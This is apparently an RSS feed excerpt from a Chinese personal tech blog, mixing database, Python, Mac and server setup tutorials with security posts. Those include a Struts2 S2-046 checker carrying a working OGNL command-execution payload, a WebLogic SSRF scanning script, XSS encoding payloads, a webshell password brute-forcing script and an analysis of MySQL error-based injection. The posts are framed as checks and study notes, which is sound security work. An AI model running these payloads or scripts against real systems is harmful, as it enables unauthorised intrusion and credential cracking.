      <description>0x00 数据库 -- 创建数据库 CREATE DATABASE student; -- 选择数据库 USE student; -- 查看当前数据库 SELECT DB_NAME(); -- 查看当前数据库 SELECT DB_NAME(); -- 查看数据库版本 SELECT @@version;  0x01 数据表 -- 创建数据库表 CREATE TABLE info ( id INT IDENTITY(1,1) PRIMARY KEY NOT NULL, name VARCHAR(20) NOT NULL DEFAULT &#39;xiaoming&#39;, sex INT NOT NULL DEFAULT 1 ) -- 查看表结构 EXEC sp_help &#39;info&#39;; -- 更新表结构 ALTER TABLE info add age int; -- 添加一列 ALTER TABLE info DROP COLUMN age; -- 删除一列 -- 插入数据 INSERT INTO info(name,sex) VALUES(&#39;xiaohong&#39;,0); -- 查看数据 SELECT * FROM dbo.</description>
    </item>
    
    <item>
      <title>MongoDB的基本使用</title>
      <link>http://wyb0.com/posts/2017/mongodb-basis-use/</link>
      <pubDate>Thu, 25 May 2017 15:33:12 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/mongodb-basis-use/</guid>
      <description>0x00 角色和权限 Mongo的授权采用了角色授权的方法，每个用户都有一组权限，Monog内建角色权限如下：
 数据库用户角色  read：允许用户读取指定数据库 readWrite：允许用户读写指定数据库  数据库管理角色  dbOwner：包含readWrite、dbAdmin、userAdmin dbAdmin：允许用户在指定数据库中对集合、文档等操作 userAdmin：允许用户向system.users集合写入，可以在指定数据库里创建、删除和管理用户  集群管理角色  clusterAdmin：只在admin数据库中可用，包含clusterManager、clusterMonitor、hostManager clusterManager： clusterMonitor： hostManager  备份和恢复角色  backup restore  所有数据库角色  readAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的读权限 readWriteAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的读写权限 dbAdminAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的dbAdmin权限 userAdminAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的userAdmin权限  超级用户角色  root：只在admin数据库中可用。超级账号，超级权限  内部角色  __system   0x01 创建用户 #创建管理员用户 &amp;gt; use admin switched to db admin &amp;gt; db.createUser({ ... user:&amp;quot;root&amp;quot;, ... pwd:&amp;quot;root123&amp;quot;, ... roles:[{&amp;quot;role&amp;quot;:&amp;quot;root&amp;quot;,&amp;quot;db&amp;quot;:&amp;quot;admin&amp;quot;}] ... }) Successfully added user: { &amp;quot;user&amp;quot; : &amp;quot;root&amp;quot;, &amp;quot;roles&amp;quot; : [ { &amp;quot;role&amp;quot; : &amp;quot;root&amp;quot;, &amp;quot;db&amp;quot; : &amp;quot;admin&amp;quot; } ] } &amp;gt; db.</description>
    </item>
    
    <item>
      <title>Mac基础设置</title>
      <link>http://wyb0.com/posts/2017/mac-basic-use/</link>
      <pubDate>Fri, 19 May 2017 16:51:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/mac-basic-use/</guid>
      <description>macOS Sierra 10.12.6
0x00 安装brew $ /usr/bin/ruby -e &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&amp;quot;  0x01 安装wget $ brew install wget  0x02 安装oh-my-zsh $ wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh $ cat /etc/shells #查看当前有什么shell $ which zsh #查看zsh路径 $ chsh -s /bin/zsh #切换shell为zsh $ vim ~/.zshrc添加alias c=&#39;clear&#39;  0x03 换源 # 对于zsh用户换源 $ echo &#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&#39; &amp;gt;&amp;gt; ~/.zshrc $ source ~/.zshrc $ brew update  0x04 安装scroll-reverser  去http://pilotmoon.com/scrollreverser下载
 0x05 安装java环境  去Oracle官网下载jre然后安装</description>
    </item>
    
    <item>
      <title>Struts2 046</title>
      <link>http://wyb0.com/posts/2017/struts2-046/</link>
      <pubDate>Sun, 16 Apr 2017 17:44:01 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/struts2-046/</guid>
      <description>Struts2 046 前段时间写的struts2 046检测脚本，代码如下：
#!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber import sys import pycurl import StringIO def initCurl(): c = pycurl.Curl() c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源 c.setopt(pycurl.MAXREDIRS, 5) # c.setopt(pycurl.PROXY,&#39;http://127.0.0.1:1080&#39;) return c def check(curl, url): head = [ &#39;Connection: close&#39;, &#39;Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150&#39; ] data = &#39;&#39;&#39;-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=&amp;quot;foo&amp;quot;; filename=&amp;quot;%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;echo dd996b71024fa97cd015f06a7f24ed30&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b&amp;quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n&#39;&#39;&#39; buf = StringIO.StringIO() curl.setopt(pycurl.WRITEFUNCTION, buf.write) curl.setopt(pycurl.POSTFIELDS, data) curl.setopt(pycurl.URL, url) # curl.setopt(pycurl.TIMEOUT, 10) curl.setopt(pycurl.HTTPHEADER, head) curl.</description>
    </item>
    
    <item>
      <title>下载大文件时显示进度条</title>
      <link>http://wyb0.com/posts/2017/python-module-tqdm/</link>
      <pubDate>Sat, 15 Apr 2017 18:49:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/python-module-tqdm/</guid>
      <description>0x00 作用 在下载大文件时以进度条的形式显示下载进度，如下图所示： 0x01 代码 #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber &amp;lt;1070018473@qq.com&amp;gt; import requests from tqdm import tqdm def get_vedio(url,name): resp = requests.get(url=url,stream=True) content_size = int(resp.headers[&#39;Content-Length&#39;])/1024/1024 with open(name, &amp;quot;wb&amp;quot;) as f: print &amp;quot;download file {}, total size: {}M&amp;quot;.format(name,content_size) for data in tqdm(iterable=resp.iter_content(1024*1024),total=content_size,unit=&#39;M&#39;): f.write(data) def get_content(filename): data = [] with open(filename) as f: lines = f.readlines() for line in lines: data.append(line.strip()) return data if __name__ == &#39;__main__&#39;: urls = get_content(&#39;urls.</description>
    </item>
    
    <item>
      <title>检测WebLogic是否存在SSRF</title>
      <link>http://wyb0.com/posts/2017/weblogic-ssrf-check/</link>
      <pubDate>Fri, 14 Apr 2017 14:43:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/weblogic-ssrf-check/</guid>
      <description>0x00 weblogic返回状态 weblogic的ssrf漏洞测试3种状态，返回如下：
 同网段不存在的主机  同网段主机存活但端口不开放  同网段主机存活且端口开放   0x01 检测脚本如下 #!/usr/bin/env python # -*- coding: utf-8 -*- import re import sys import Queue import requests import threading from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) queue = Queue.Queue() mutex = threading.Lock() class Weblogic_SSRF_Check(threading.Thread): &amp;quot;&amp;quot;&amp;quot;docstring for Weblogic_SSRF_Check&amp;quot;&amp;quot;&amp;quot; def __init__(self, queue): threading.Thread.__init__(self) self.queue = queue def check(self,domain,ip): payload = &amp;quot;uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&amp;amp;rdoSearch=name&amp;amp;txtSearchname=sdf&amp;amp;txtSearchkey=&amp;amp;txtSearchfor=&amp;amp;selfor=Business+location&amp;amp;btnSubmit=Search&amp;quot;.format(ip=ip) url = domain + payload try: html = requests.get(url=url, timeout=15, verify=False).content m = re.</description>
    </item>
    
    <item>
      <title>XSS中的编码</title>
      <link>http://wyb0.com/posts/2017/xss-encode/</link>
      <pubDate>Thu, 30 Mar 2017 15:25:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/xss-encode/</guid>
      <description>0x00 浏览器解析 浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;时， 会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容， 对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本， 在这之前它是HTML的一部分  0x01 一些编码  URL编码
%+字符的ASCII编码对应的两位十六进制，如&amp;quot;/&amp;quot;的url编码为&amp;quot;%2F&amp;quot;  HTML编码
 实体编码
&amp;amp;开头分号结尾，如 &amp;quot;&amp;lt;&amp;quot; 的编码是 &amp;quot;&amp;amp;lt;&amp;quot;  字符编码
样式为&amp;quot;&amp;amp;#数值;&amp;quot;，数值可为10进制、16进制ASCII编码或unicode字符编码 如&amp;quot;&amp;lt;&amp;quot;可编码为&amp;quot;&amp;amp;#060;&amp;quot;和&amp;quot;&amp;amp;#x3c;&amp;quot;，但是必须在属性值里面   JS编码
1、两个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\x3c&amp;quot; 2、三个八进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\074&amp;quot; 3、四个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\u003c&amp;quot; 4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）  CSS编码
反斜线(\)后跟1~6位的16进制数字，如&amp;quot;e&amp;quot;为&amp;quot;\65&amp;quot;或&amp;quot;65&amp;quot;或&amp;quot;00065&amp;quot;   0x02 编码与解码顺序 解码时先解码最外层，编码时先编码最内层
如&amp;lt;td onclick=&amp;quot;openUrl(add.do?userName=&#39;{$value}&#39;);&amp;quot;&amp;gt;11&amp;lt;/td&amp;gt;， 首先value出现在url中，而url在js中，而js又是html一部分，所以 解码顺序为：html解码-&amp;gt;js解码-&amp;gt;url解码 编码顺序为：url编码-&amp;gt;js编码-&amp;gt;html编码  0x03 利用  八进制
&amp;lt;p id=&amp;quot;test&amp;quot;&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; var test = &amp;quot;\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76&amp;quot;; var p = document.getElementById(&#39;test&#39;); #这里会进行js解码 p.innerHTML = test; &amp;lt;/script&amp;gt;  十进制和十六进制
&amp;lt;img src=x onerror=&amp;quot;\u0061\u006c\u0065\u0072\u0074(1)&amp;quot;&amp;gt; &amp;lt;img src=x onerror=&amp;quot;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#49;&amp;amp;#41;&amp;quot;&amp;gt;  javascript协议</description>
    </item>
    
    <item>
      <title>Python的pycurl模块</title>
      <link>http://wyb0.com/posts/2017/python-module-pycurl/</link>
      <pubDate>Tue, 21 Mar 2017 23:18:50 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/python-module-pycurl/</guid>
      <description>0x00 关于cURL cURL可以使用URL的语法模拟浏览器来传输数据，它支持FTP、FTPS、HTTP、HTTPS、GOPHER、TELNET、DICT、FILE以及LDAP等多种协议。
利用cURL可以实现：HTTPS认证、HTTP POST方法、HTTP PUT方法、FTP上传、keyberos认证、代理服务器、cookies、用户名/密码认证、下载文件断点续传、上传文件断点续传、http代理服务器管道等等。
0x01 pycurl常见方法  创建curl对象  c = pycurl.Curl() #创建一个curl对象   设置请求  c.setopt(pycurl.URL,&amp;quot;http://www.baidu.com&amp;quot;) #指定请求的URL c.setopt(pycurl.CONNECTTIMEOUT, 5) #连接的等待时间，设置为0则不等待 c.setopt(pycurl.TIMEOUT, 5) #请求超时时间 c.setopt(pycurl.USERAGENT,&amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0&amp;quot;) #配置User-Agent c.setopt(pycurl.NOPROGRESS, 0) #是否屏蔽下载进度条，非0则屏蔽 c.setopt(pycurl.MAXREDIRS, 5) #指定HTTP重定向的最大数 c.setopt(pycurl.FORBID_REUSE, 1) #完成交互后强制断开连接，不重用 c.setopt(pycurl.FRESH_CONNECT,1) #强制获取新的连接，即替代缓存中的连接 c.setopt(pycurl.DNS_CACHE_TIMEOUT,60) #设置保存DNS信息的时间，默认为120秒 c.setopt(pycurl.HEADERFUNCTION, getheader) #将返回的HTTP HEADER定向到回调函数getheader c.setopt(pycurl.WRITEFUNCTION, getbody) #将返回的内容定向到回调函数getbody c.setopt(pycurl.WRITEHEADER, fileobj) #将返回的HTTP HEADER定向到fileobj文件对象 c.setopt(pycurl.WRITEDATA, fileobj) #将返回的HTML内容定向到fileobj文件对象   部分返回信息  c.getinfo(pycurl.HTTP_CODE) #返回的HTTP状态码 c.</description>
    </item>
    
    <item>
      <title>在vps上搭建Shadowsocks</title>
      <link>http://wyb0.com/posts/2017/vps-set-up-shadowsocks/</link>
      <pubDate>Fri, 10 Mar 2017 10:34:40 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/vps-set-up-shadowsocks/</guid>
      <description>0x01 安装与配置 环境：Ubuntu 14.04.1 LTS
reber@localhost:~$ sudo apt-get update reber@localhost:~$ python --version Python 2.7.6 reber@localhost:~$ sudo apt-get install python-gevent python-pip reber@localhost:~$ sudo pip install shadowsocks reber@localhost:~$ vim /home/reber/shadowsocks.json { &amp;quot;server&amp;quot;:&amp;quot;服务器 IP 地址&amp;quot;, # 服务器 IP (IPv4/IPv6) &amp;quot;server_port&amp;quot;:8388, # 监听的服务器端口 &amp;quot;local_address&amp;quot;: &amp;quot;127.0.0.1&amp;quot;, # 本地监听的 IP 地址 &amp;quot;local_port&amp;quot;:1080, # 本地端端口 &amp;quot;password&amp;quot;:&amp;quot;mypassword&amp;quot;, # 密码 #&amp;quot;port_password&amp;quot;: #{ # &amp;quot;40001&amp;quot;: &amp;quot;password1&amp;quot;, # &amp;quot;40002&amp;quot;: &amp;quot;password2&amp;quot;, # &amp;quot;40003&amp;quot;: &amp;quot;password3&amp;quot; #}, #&amp;quot;_comment&amp;quot;: #{ # &amp;quot;40001&amp;quot;: &amp;quot;xiaoming&amp;quot;, # &amp;quot;40002&amp;quot;: &amp;quot;lilei&amp;quot;, # &amp;quot;40003&amp;quot;: &amp;quot;mike&amp;quot; #} &amp;quot;timeout&amp;quot;:300, # 超时时间（秒） &amp;quot;method&amp;quot;:&amp;quot;aes-256-cfb&amp;quot;, # 加密方式 # 若Linux内核在3.</description>
    </item>
    
    <item>
      <title>利用多参数提高webshell爆破速度</title>
      <link>http://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</link>
      <pubDate>Fri, 17 Feb 2017 10:32:24 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</guid>
      <description>0x00 原理 之前在https://www.t00ls.net/viewthread.php?tid=36985看到这个思路的。
Apache下默认同时允许接收1000个参数；IIS下默认同时允许接收5883个参数，可以一次提交多个密码，从而快速爆破。
0x01 爆破webshell代码 #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber &amp;lt;1070018473@qq.com&amp;gt; import sys import requests proxy = {&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;} headers = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0&#39;, &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;, &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;, } def get_file(filename): data = [] with open(filename,&#39;r&#39;) as f: lines = f.readlines() for line in lines: data.append(line.strip()) return data def get_payloads(data): payloads = [] for x in xrange(0,10): print x*1000,(x+1)*1000 payload = [] for y in data[x*1000:(x+1)*1000]: payload.</description>
    </item>
    
    <item>
      <title>301重定向</title>
      <link>http://wyb0.com/posts/2017/301-redirect/</link>
      <pubDate>Tue, 07 Feb 2017 10:49:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/301-redirect/</guid>
      <description> 0x00 目的 由于博客更换了域名，原来百度收录的都成了死链，所以做一下301重定向 我使用的是github搭建的博客，都是html的文件，先把html文件都上传到自己的服务器上， 修改dns使原域名指向服务器，让百度收录的链接都能够访问，然后设置301 服务器环境：Ubuntu 14.04.5、Apache2  0x01 开启rewrite模块 $ sudo a2enmod rewrite  0x02 根目录下新建.htaccess： Options +FollowSymLinks RewriteEngine on RewriteRule ^(.*)$ http://wyb0.com/$1 [L,R=301] # 这里换上新域名  0x03 修改配置文件 # AllowOverride None 改为AllowOverride All $ sudo vim /etc/apache2/apache2.conf &amp;lt;Directory /var/www/&amp;gt; Options FollowSymLinks AllowOverride All Require all granted &amp;lt;/Directory&amp;gt;  0x04 重启Apache $ sudo /etc/init.d/apache2 restart  </description>
    </item>
    
    <item>
      <title>Ubuntu下部署Gitlab</title>
      <link>http://wyb0.com/posts/2017/ubuntu-set-up-gitlab/</link>
      <pubDate>Mon, 16 Jan 2017 20:18:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/ubuntu-set-up-gitlab/</guid>
      <description>0x00 前期准备 # 环境 Ubuntu 14.04 reber@ubuntu:~/Desktop$ sudo apt-get install openssh-server reber@ubuntu:~/Desktop$ sudo apt-get install openssh-client reber@ubuntu:~/Desktop$ sudo apt-get install git  0x01 安装 reber@ubuntu:~/Desktop$ wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/trusty/main/g/gitlab-ce/gitlab-ce_8.8.0-ce.0_amd64.deb reber@ubuntu:~/Desktop$ sudo dpkg -i gitlab-ce_8.8.0-ce.0_amd64.deb  0x02 配置 reber@ubuntu:~/Desktop$ sudo vim /etc/gitlab/gitlab.rb external_url &#39;http://192.168.188.160:80&#39; ...... gitlab_rails[&#39;time_zone&#39;] = &#39;Asia/Shanghai&#39; gitlab_rails[&#39;gitlab_email_from&#39;] = &#39;xxxxxx@163.com&#39; ...... gitlab_rails[&#39;smtp_enable&#39;] = true gitlab_rails[&#39;smtp_address&#39;] = &amp;quot;smtp.163.com&amp;quot; gitlab_rails[&#39;smtp_port&#39;] = 25 gitlab_rails[&#39;smtp_user_name&#39;] = &amp;quot;xxxxxx@163.com&amp;quot; gitlab_rails[&#39;smtp_password&#39;] = &amp;quot;111111&amp;quot; # 客户端授权密码 gitlab_rails[&#39;smtp_domain&#39;] = &amp;quot;163.com&amp;quot; gitlab_rails[&#39;smtp_authentication&#39;] = &amp;quot;login&amp;quot; gitlab_rails[&#39;smtp_enable_starttls_auto&#39;] = true .</description>
    </item>
    
    <item>
      <title>初识Tornado</title>
      <link>http://wyb0.com/posts/2017/tornado-basis/</link>
      <pubDate>Tue, 03 Jan 2017 18:43:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2017/tornado-basis/</guid>
      <description>0x00 简介 Tornado是一个用Python写的相对简单的、不设障碍的Web服务器架构,用以处理上万的同时的 连接口,让实时的Web服务通畅起来。虽然跟现在的一些用Python写的Web架构相似,比如Django, 但Tornado更注重速度,能够处理海量的同时发生的流量。  0x01 示例 main.py代码如下：
#!/usr/bin/env python # -*- coding: utf-8 -*- import tornado.ioloop import tornado.web class IndexHandler(tornado.web.RequestHandler): def get(self): #访问根时触发这个函数 name = self.get_argument(&#39;name&#39;,&#39;wyb&#39;) self.write(&#39;Hello,&#39; + name) self.write(&#39;&amp;lt;br /&amp;gt;&amp;lt;a href=&amp;quot;/login&amp;quot;&amp;gt;login&amp;lt;/a&amp;gt;&#39;) class MyLoginHandler(tornado.web.RequestHandler): def get(self): self.render(&#39;login.html&#39;) #若用户请求/login页面则将login.html发送给客户端，客户会看的一个登陆表单 def post(self): #当用户点击提交按钮是触发这个函数 name = self.get_argument(&#39;name&#39;) #接收表单的name password = self.get_argument(&#39;password&#39;) #接收表单的password self.write(&amp;quot;you name is:%s\nyou password is:%s&amp;quot; % (name,password)) def get_app(): handlers = [ (r&amp;quot;/&amp;quot;,IndexHandler), #代表请求/的都让IndexHandler处理 (r&amp;quot;/login&amp;quot;,MyLoginHandler), #表示请求/login页面的让MyLoginHandler处理 ] app = tornado.</description>
    </item>
    
    <item>
      <title>[转]JS操作cookie方法的封装</title>
      <link>http://wyb0.com/posts/2016/js-package-cookie-function/</link>
      <pubDate>Tue, 27 Dec 2016 11:49:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/js-package-cookie-function/</guid>
      <description>原文链接：http://www.wyzu.cn/2015/0123/107167.html
0x00 实现功能  添加cookie 获取所有cookie 根据名字获取单个cookie的值 移除所有cookie 根据名字移除单个cookie  0x01 封装cookie.js源码 /* * 名称和值传送时必须是经过RUL编码的 * cookie绑定在指定的域名下，非本域无法共享cookie，但是可以是在主站共享cookie给子站 * cookie的名称不分大小写；同时建议将cookie URL编码 * 建议针对cookie设置expires、domain、 path；每个cookie小于4KB **/ (function(global){ function getCookiesObj() { //获得cookie对象 var cookies = {}; if (document.cookie) { var objs = document.cookie.split(&#39;; &#39;); for (var i in objs) { var index = objs[i].indexOf(&#39;=&#39;), name = objs[i].substr(0,index), value = objs[i].substr(index+1,objs[i].length); cookies[name] = value; } } return cookies; } function set(sName,sValue,Opts) { //设置cookie // Opts expires,path,domain,secure if (sName &amp;amp;&amp;amp; sValue) { var cookie = encodeURIComponent(sName)+&#39;=&#39;+encodeURIComponent(sValue); if (Opts) { if (Opts.</description>
    </item>
    
    <item>
      <title>Python实现CDN的判断</title>
      <link>http://wyb0.com/posts/2016/python-cnd-check/</link>
      <pubDate>Fri, 23 Dec 2016 21:10:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-cnd-check/</guid>
      <description>0x00 什么是CDN CDN的全称是Content Delivery Network，即内容分发网络。主要功能是在不同地点缓存内容， 运营商会在全国各地的节点上缓存你的网站网页，通过负载均衡技术，将用户的请求定向到最合适的 缓存服务器上去获取内容，比如说你是上海用户，你访问www.aa.com就会被重定向到上海的节点， 你是北京用户，你也访问www.aa.com，但是你会被重定向到上海的节点。  0x01 判断方法  可以查询CNAME记录，每个cdn厂商都有特有的特征串 查看http返回头的头部信息  0x02 代码 首先安装dnspython这个第三方模块：pip install dnspython
#!/usr/bin/env python # -*- coding: utf-8 -*- import sys import dns.resolver import urllib2 import urlparse class CdnCheck(object): def __init__(self, url): super(CdnCheck, self).__init__() self.cdninfo() self.url = url self.cnames = [] self.headers = [] def get_cnames(self): # get all cname furl = urlparse.urlparse(self.url) url = furl.netloc # print url rsv = dns.</description>
    </item>
    
    <item>
      <title>使用Python的openpyxl模块读写xlsx文件</title>
      <link>http://wyb0.com/posts/2016/python-module-openpyxl/</link>
      <pubDate>Fri, 25 Nov 2016 17:44:23 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-module-openpyxl/</guid>
      <description>0x00 openpyxl模块 这个模块可以让你读写excel文件
0x01 读取数据 代码如下：
#!/usr/bin/env python # -*- coding: utf-8 -*- from openpyxl import load_workbook #设置data_only=True，否则如果文件中有计算公式的话读出来的是公式不是数值 wb = load_workbook(filename=&#39;aa.xlsx&#39;,data_only=True) sheetnames = wb.get_sheet_names() #获得所有表名 print u&amp;quot;存在表：%s&amp;quot; % sheetnames ws = wb.get_sheet_by_name(sheetnames[0]) print u&amp;quot;第一张表表名为：%s&amp;quot; % ws.title #Sheet1 rows = ws.max_row #行数 columns = ws.max_column #列数 print &amp;quot;表%s有%d行%d列&amp;quot; % (ws.title,rows,columns) #10 2 共10行2列 print print u&amp;quot;取部分数据：&amp;quot; print ws[&#39;A1&#39;].value,ws[&#39;B1&#39;].value print ws[&#39;A2&#39;].value,ws[&#39;B2&#39;].value print ws.cell(row=1, column=2).value print u&amp;quot;\n输出表%s的所有数据：&amp;quot; % ws.title for x in range(1,rows+1): for y in range(1,columns+1): print ws.</description>
    </item>
    
    <item>
      <title>AJAX与PHP</title>
      <link>http://wyb0.com/posts/2016/ajax-and-php/</link>
      <pubDate>Wed, 16 Nov 2016 10:37:03 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/ajax-and-php/</guid>
      <description>0x00 AJAX与PHP ajax.html代码如下：
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt; &amp;lt;script&amp;gt; function showHint(str) { var xmlhttp; if (str.length==0) { document.getElementById(&amp;quot;txtHint&amp;quot;).innerHTML=&amp;quot;&amp;quot;; return; } if (window.XMLHttpRequest) { // IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码 xmlhttp=new XMLHttpRequest(); //创建对象 } else { // IE6, IE5 浏览器执行代码 xmlhttp=new ActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;); } xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 &amp;amp;&amp;amp; xmlhttp.status==200) { document.getElementById(&amp;quot;txtHint&amp;quot;).innerHTML=xmlhttp.responseText; } } xmlhttp.open(&amp;quot;GET&amp;quot;,&amp;quot;./ajax.php?q=&amp;quot;+str,true); xmlhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h3&amp;gt;在输入框中尝试输入字母 a:&amp;lt;/h3&amp;gt; &amp;lt;form action=&amp;quot;&amp;quot;&amp;gt; 输入姓名: &amp;lt;input type=&amp;quot;text&amp;quot; id=&amp;quot;txt1&amp;quot; onkeyup=&amp;quot;showHint(this.value)&amp;quot; /&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;p&amp;gt;提示信息: &amp;lt;span id=&amp;quot;txtHint&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  上面的代码会完成以下的东西： 1.</description>
    </item>
    
    <item>
      <title>[转]MySQL报错注入原理分析(count()、rand()、group by)</title>
      <link>http://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</link>
      <pubDate>Sun, 13 Nov 2016 11:59:26 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</guid>
      <description>原文链接：http://drops.wooyun.org/tips/14312
0x00 疑问 一直在用mysql数据库报错注入方法，但为何会报错？
百度谷歌知乎了一番，发现大家都是把官网的结论发一下截图，然后执行sql语句证明一下结论，但是没有人去深入研究为什么rand不能和order by一起使用，也没彻底说明三者同时使用报错的原理。
0x01 位置问题？ select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;这是网上最常见的语句,目前位置看到的网上sql注入教程,floor 都是直接放count(*)后面，为了排除干扰，我们直接对比了两个报错语句，如下图
由上面的图片，可以知道报错跟位置无关。
0x02 绝对报错还是相对报错？ 是不是报错语句有了floor(rand(0)*2)以及其他几个条件就一定报错？其实并不是如此，我们先建建个表，新增一条记录看看，如下图： 确认表中只有一条记录后，再执行报错语句看看，如下图： 多次执行均未发现报错。
然后我们新增一条记录。 然后再测试下报错语句 多次执行并没有报错
OK 那我们再增加一条 执行报错语句 ok 成功报错
由此可证明floor(rand(0)*2)报错是有条件的，记录必须3条以上，而且在3条以上必定报错，到底为何？请继续往下看。
0x03 随机因子具有决定权么(rand()和rand(0)) 为了更彻底的说明报错原因，直接把随机因子去掉，再来一遍看看，先看一条记录的时候，如下图: 一条记录的话 无论执行多少次也不报错
然后增加一条记录。
两条记录的话 结果就变成不确定性了 随机出现报错。
然后再插入一条
三条记录之后，也和2条记录一样进行随机报错。
由此可见报错和随机因子是有关联的，但有什么关联呢，为什么直接使用rand()，有两条记录的情况下就会报错，而且是有时候报错，有时候不报错，而rand(0)的时候在两条的时候不报错，在三条以上就绝对报错？我们继续往下看。
0x04 不确定性与确定性 前面说过，floor(rand(0)*2)报错的原理是恰恰是由于它的确定性，这到底是为什么呢？从0x03我们大致可以猜想到，因为floor(rand()*2)不加随机因子的时候是随机出错的，而在3条记录以上用floor(rand(0)*2)就一定报错，由此可猜想floor(rand()*2)是比较随机的，不具备确定性因素，而floor(rand(0)*2)具备某方面的确定性。
为了证明我们猜想，分别对floor(rand()*2)和floor(rand(0)*2)在多记录表中执行多次(记录选择10条以上)，在有12条记录表中执行结果如下图：
mysql&amp;gt; select floor(rand()*2) from `T-Safe`; +-----------------+ | floor(rand()*2) | +-----------------+ | 0 | | 0 | | 0 | | 0 | | 0 | | 0 | | 1 | | 0 | | 0 | | 0 | | 0 | | 0 | +-----------------+ 12 rows in set (0.</description>
    </item>
    
    <item>
      <title>AJAX的XHR请求与响应</title>
      <link>http://wyb0.com/posts/2016/ajax-request-and-response/</link>
      <pubDate>Tue, 25 Oct 2016 00:53:13 +0800</pubDate>
      
